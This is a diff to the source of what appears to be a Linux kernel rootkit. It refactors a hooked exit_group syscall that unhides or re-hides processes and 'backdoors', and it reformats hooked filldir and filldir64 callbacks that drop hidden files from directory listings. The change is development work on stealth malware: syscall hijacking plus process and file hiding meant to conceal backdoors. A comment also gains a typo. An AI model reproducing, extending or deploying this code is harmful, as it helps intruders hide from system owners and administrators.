@@ -56,23 +56,21 @@ static DEFINE_SPINLOCK(hide_once_spin);
  * ├── hidden No → normal flow
  * └── hidden Yes
  *     └── Backdoor Yes
- *         ├── unhide all backdoors → kill all backdoors
+ *         ├── unhide and kill all back-doorss
  *     └── Backdoor No
  *         ├── unhide task
  */
 static asmlinkage long m_exit_group(struct pt_regs *regs)
 {
-	long rc = 0L;
 	struct hidden_status status = { 0 };
 
 	/** load the status of PID */
 	if (!kv_find_hidden_pid(&status, current->pid))
-		goto m_exit;
+		goto orig;
 
 	/** Is backdoor? */
 	if (status.saddr) {
 		kv_unhide_task_by_pid_exit_group(current->pid);
-		goto leave;
 	} else {
 		/**
          * it is regular hidden PID and needs to
@@ -81,10 +79,8 @@ static asmlinkage long m_exit_group(struct pt_regs *regs)
 		kv_hide_task_by_pid(current->pid, 0, NO_CHILDREN);
 	}
 
-m_exit:
-	rc = real_m_exit_group(regs);
-leave:
-	return rc;
+orig:
+	return real_m_exit_group(regs);
 }
 
 /*
@@ -859,10 +855,10 @@ static bool (*real_filldir)(struct dir_context *, const char *, int, loff_t,
 static bool m_filldir(struct dir_context *ctx, const char *name, int namlen,
 		      loff_t offset, u64 ino, unsigned int d_type)
 #else
-static int (*real_filldir)(struct dir_context *, const char *, int, loff_t,
-			    u64, unsigned int);
+static int (*real_filldir)(struct dir_context *, const char *, int, loff_t, u64,
+			   unsigned int);
 static int m_filldir(struct dir_context *ctx, const char *name, int namlen,
-		      loff_t offset, u64 ino, unsigned int d_type)
+		     loff_t offset, u64 ino, unsigned int d_type)
 #endif
 {
 	/** For certain hidden files we don't have inode number initially,
@@ -891,12 +887,11 @@ static bool m_filldir64(struct dir_context *ctx, const char *name, int namlen,
 			loff_t offset, u64 ino, unsigned int d_type)
 #else
 static int (*real_filldir64)(struct dir_context *, const char *, int, loff_t,
-			      u64, unsigned int);
+			     u64, unsigned int);
 static int m_filldir64(struct dir_context *ctx, const char *name, int namlen,
-			loff_t offset, u64 ino, unsigned int d_type)
+		       loff_t offset, u64 ino, unsigned int d_type)
 #endif
 {
-
 	if (fs_search_name(name, ino))
 #if LINUX_VERSION_CODE >= KERNEL_VERSION(6, 1, 0)
 		return true;
